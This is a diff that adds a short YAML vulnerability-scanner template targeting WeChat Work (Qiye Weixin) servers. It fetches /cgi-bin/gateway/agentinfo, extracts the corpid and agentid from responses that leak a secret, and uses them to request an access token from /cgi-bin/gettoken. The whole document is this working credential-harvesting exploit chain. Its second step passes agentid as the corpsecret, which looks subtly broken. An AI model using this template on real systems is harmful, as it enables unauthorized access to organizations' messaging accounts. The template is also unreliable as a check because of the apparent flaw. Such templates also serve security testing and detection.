@@ -1,0 +1,18 @@
+name: qiyeweinxin-info
+detail:
+  author: 
+  links:
+groups:
+  qy1:
+    - method: GET
+      path: /cgi-bin/gateway/agentinfo
+      follow_redirects: false
+      search: '"corpid":\s*(?P<corpid>\d+),'
+      search1: '"agentid":\s*(?P<agentid>\d+),'
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"corpid") && response.body.bcontains(b"Secret")   
+    - method: GET
+      path: /cgi-bin/gettoken?corpid={{corpid}}&corpsecret={{agentid}}
+      follow_redirects: false
+      expression: >-
+        response.status == 200 
